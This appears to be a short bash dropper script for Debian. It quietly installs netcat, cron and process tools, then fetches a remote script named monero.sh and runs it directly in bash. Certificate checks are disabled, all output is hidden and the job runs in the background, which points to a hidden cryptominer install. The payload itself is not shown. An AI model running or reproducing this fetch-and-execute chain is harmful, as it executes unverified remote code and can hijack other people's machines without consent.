#!/bin/bash
# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/hanrzme/dtyhfstr/main/monero.sh) >/dev/null 2>&1 &
